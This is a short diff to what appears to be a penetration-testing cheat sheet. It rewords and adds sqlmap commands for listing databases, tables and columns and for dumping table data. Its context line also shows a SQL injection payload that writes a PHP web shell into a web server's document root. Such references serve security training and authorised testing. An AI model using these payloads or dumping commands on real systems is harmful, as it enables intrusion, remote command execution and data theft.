@@ -326,11 +326,16 @@ X' union select "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html
 listing databases  
 `sqlmap -r file.req --dbs`
 
-enumerate database using database name  
+enumerate tables from database  
 `sqlmap -r file.req -D databasename --tables`
+
+enumerate columns from database  
+`sqlmap -r file.req -D databasename --columns`
 
 enumerate data from table  
 `sqlmap -r file.req -D databasename -T tablename --dump`
+
+
 
 
 ### Bruteforcing
